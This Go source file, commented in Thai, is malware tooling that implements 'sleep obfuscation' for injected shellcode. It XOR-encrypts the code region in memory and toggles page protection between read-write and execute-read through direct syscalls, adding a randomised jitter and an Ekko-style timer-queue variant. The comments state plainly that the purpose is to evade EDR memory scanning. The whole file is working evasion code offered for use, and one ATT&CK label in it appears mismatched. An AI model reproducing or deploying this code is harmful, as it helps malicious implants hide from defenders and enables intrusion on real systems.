package main

import (
	"crypto/rand"
	"fmt"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Sleep Obfuscation — encrypt ตัวเองใน memory ตอนหลับ
//
// ทำงานยังไง:
//   1. ก่อนหลับ: encrypt shellcode region ใน memory ด้วย random key
//   2. เปลี่ยน memory protection เป็น RW (ไม่มี Execute = ดูไม่เหมือน code)
//   3. หลับตามเวลาที่กำหนด
//   4. ตื่น: เปลี่ยนกลับเป็น RX + decrypt shellcode
//   5. ทำงานต่อ
//
//   EDR scan memory ตอนหลับ:
//     - เห็นแค่ data ที่ encrypt (ไม่ใช่ executable code)
//     - memory protection เป็น RW (ปกติ = data)
//     - ไม่มี pattern ของ malware
//
// MITRE ATT&CK: T1027.012 (Obfuscated Files: Dynamic API Resolution) + T1497 (Virtualization/Sandbox Evasion)

func sleepObfuscationLoop(shellcodeRegion []byte) {
	if len(shellcodeRegion) == 0 {
		return
	}

	// สร้าง XOR key แบบ random
	key := make([]byte, 32)
	rand.Read(key)

	for {
		// --- ENCRYPT & SLEEP ---

		// 1. XOR encrypt shellcode region ใน memory
		xorCrypt(shellcodeRegion, key)

		// 2. เปลี่ยน protection เป็น RW ด้วย direct syscall (ไม่มี Execute)
		//    ใช้ NtProtectVirtualMemory โดยตรงแทน VirtualProtect
		//    → ไม่มี "VirtualAlloc" string ใน binary
		if len(shellcodeRegion) > 0 {
			addr := uintptr(unsafe.Pointer(&shellcodeRegion[0]))
			size := uintptr(len(shellcodeRegion))
			var oldProtect uint32
			ntProtectVirtualMemory(
				windows.CurrentProcess(),
				&addr, &size,
				PAGE_READWRITE, &oldProtect,
			)
		}

		// 3. หลับ (30 วินาที + jitter)
		sleepDuration := calculateJitter(30*time.Second, 50)
		time.Sleep(sleepDuration)

		// --- DECRYPT & RESUME ---

		// 4. เปลี่ยนกลับเป็น RX ด้วย direct syscall
		if len(shellcodeRegion) > 0 {
			addr := uintptr(unsafe.Pointer(&shellcodeRegion[0]))
			size := uintptr(len(shellcodeRegion))
			var oldProtect uint32
			ntProtectVirtualMemory(
				windows.CurrentProcess(),
				&addr, &size,
				PAGE_EXECUTE_READ, &oldProtect,
			)
		}

		// 5. Decrypt shellcode กลับ
		xorCrypt(shellcodeRegion, key)

		// 6. เปลี่ยน key ทุกรอบ (ไม่ซ้ำกัน)
		rand.Read(key)
	}
}

// XOR encrypt/decrypt (same operation)
func xorCrypt(data []byte, key []byte) {
	for i := range data {
		data[i] ^= key[i%len(key)]
	}
}

// คำนวณ sleep time + jitter
// เช่น base=30s, jitterPercent=50 → random ระหว่าง 15-45 วินาที
func calculateJitter(base time.Duration, jitterPercent int) time.Duration {
	if jitterPercent <= 0 {
		return base
	}

	jitterRange := int64(base) * int64(jitterPercent) / 100
	jitterBytes := make([]byte, 8)
	rand.Read(jitterBytes)

	// Convert random bytes to int64
	var randomVal int64
	for i := 0; i < 8; i++ {
		randomVal = (randomVal << 8) | int64(jitterBytes[i])
	}
	if randomVal < 0 {
		randomVal = -randomVal
	}

	jitter := randomVal % (2 * jitterRange) - jitterRange
	result := int64(base) + jitter

	if result < int64(base)/4 { // minimum 25% of base
		result = int64(base) / 4
	}

	return time.Duration(result)
}

// =============================================================================
// Ekko Sleep Obfuscation (Advanced) — Timer Queue based
// =============================================================================
//
// ทำงานยังไง:
//   แทนที่จะมี thread ที่ทำ encrypt/decrypt ให้ EDR เห็น
//   ใช้ Windows Timer Queue เป็น scheduler:
//
//   Timer 1 (t=0ms):      สลับ protection → RW  (shellcode ไม่ executable)
//   Timer 2 (t=1ms):      XOR encrypt shellcode  (หน้าตาเป็น random data)
//   Timer 3 (t=sleepMs):  decrypt + สลับกลับ RX  (พร้อมใช้งาน)
//   Main thread:          WaitForSingleObject (block ตาม sleepMs)
//
//   EDR เห็น:
//     - Thread block อยู่ที่ WaitForSingleObject (ปกติ)
//     - Memory เป็น RW data ที่ encrypt (ไม่ใช่ shellcode)
//     - ไม่มี thread แยกที่ทำ encrypt/decrypt
//     - Timer callback เรียก RtlCopyMemory (มาจาก ntdll — ดูปกติ)
//
// MITRE ATT&CK: T1027.012

// ekkoContext เก็บ state ที่แชร์ระหว่าง timer callbacks
type ekkoContext struct {
	regionAddr uintptr
	regionSize uint32
	key        [32]byte
	oldProtect uint32
	doneEvent  windows.Handle
}

// ekkoSleepObfuscation — Ekko Sleep ด้วย Timer Queue จริง
//
// Parameters:
//   regionAddr — address ของ shellcode ใน memory
//   regionSize — ขนาด shellcode
//   sleepMs    — จำนวน millisecond ที่จะหลับ
func ekkoSleepObfuscation(regionAddr uintptr, regionSize uint32, sleepMs uint32) error {
	// สร้าง random key
	ctx := &ekkoContext{
		regionAddr: regionAddr,
		regionSize: regionSize,
	}
	rand.Read(ctx.key[:])

	// สร้าง event สำหรับรอ timer ครบ
	event, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return fmt.Errorf("CreateEvent failed: %w", err)
	}
	defer windows.CloseHandle(event)
	ctx.doneEvent = event

	// สร้าง Timer Queue
	procCreateTimerQueue := kernel32.NewProc("CreateTimerQueue")
	queue, _, err := procCreateTimerQueue.Call()
	if queue == 0 {
		return fmt.Errorf("CreateTimerQueue failed: %w", err)
	}
	defer func() {
		procDeleteTimerQueueEx := kernel32.NewProc("DeleteTimerQueueEx")
		procDeleteTimerQueueEx.Call(queue, 0)
	}()

	procCreateTimerQueueTimer := kernel32.NewProc("CreateTimerQueueTimer")

	// Timer 1 (delay=0ms): สลับ protection เป็น RW ด้วย direct syscall
	var timer1 uintptr
	cb1 := windows.NewCallback(func(param uintptr, timerFired byte) uintptr {
		c := (*ekkoContext)(unsafe.Pointer(param))
		addr := c.regionAddr
		size := uintptr(c.regionSize)
		ntProtectVirtualMemory(windows.CurrentProcess(), &addr, &size, PAGE_READWRITE, &c.oldProtect)
		return 0
	})
	ret, _, _ := procCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&timer1)),
		queue,
		cb1,
		uintptr(unsafe.Pointer(ctx)),
		0,    // dueTime: ทันที
		0,    // period: ครั้งเดียว
		0x20, // WT_EXECUTEINTIMERTHREAD
	)
	if ret == 0 {
		return fmt.Errorf("CreateTimerQueueTimer (protect) failed")
	}

	// Timer 2 (delay=1ms): XOR encrypt shellcode
	var timer2 uintptr
	cb2 := windows.NewCallback(func(param uintptr, timerFired byte) uintptr {
		c := (*ekkoContext)(unsafe.Pointer(param))
		region := unsafe.Slice((*byte)(unsafe.Pointer(c.regionAddr)), c.regionSize)
		key := c.key[:]
		for i := range region {
			region[i] ^= key[i%len(key)]
		}
		return 0
	})
	ret, _, _ = procCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&timer2)),
		queue,
		cb2,
		uintptr(unsafe.Pointer(ctx)),
		1,    // dueTime: 1ms หลัง timer 1
		0,    // period: ครั้งเดียว
		0x20, // WT_EXECUTEINTIMERTHREAD
	)
	if ret == 0 {
		return fmt.Errorf("CreateTimerQueueTimer (encrypt) failed")
	}

	// Timer 3 (delay=sleepMs): decrypt + สลับกลับ RX + signal done
	var timer3 uintptr
	cb3 := windows.NewCallback(func(param uintptr, timerFired byte) uintptr {
		c := (*ekkoContext)(unsafe.Pointer(param))

		// Decrypt shellcode กลับ (XOR อีกรอบ = decrypt)
		region := unsafe.Slice((*byte)(unsafe.Pointer(c.regionAddr)), c.regionSize)
		key := c.key[:]
		for i := range region {
			region[i] ^= key[i%len(key)]
		}

		// สลับ protection กลับ RX ด้วย direct syscall
		addr := c.regionAddr
		size := uintptr(c.regionSize)
		var dummy uint32
		ntProtectVirtualMemory(windows.CurrentProcess(), &addr, &size, PAGE_EXECUTE_READ, &dummy)

		// Signal event ว่าตื่นแล้ว
		windows.SetEvent(c.doneEvent)
		return 0
	})
	ret, _, _ = procCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&timer3)),
		queue,
		cb3,
		uintptr(unsafe.Pointer(ctx)),
		uintptr(sleepMs), // dueTime: ตื่นหลัง sleepMs
		0,                // period: ครั้งเดียว
		0x20,             // WT_EXECUTEINTIMERTHREAD
	)
	if ret == 0 {
		return fmt.Errorf("CreateTimerQueueTimer (decrypt) failed")
	}

	// Main thread block รอ event — ดูเหมือน thread ปกติที่กำลังรอ
	windows.WaitForSingleObject(event, windows.INFINITE)

	return nil
}
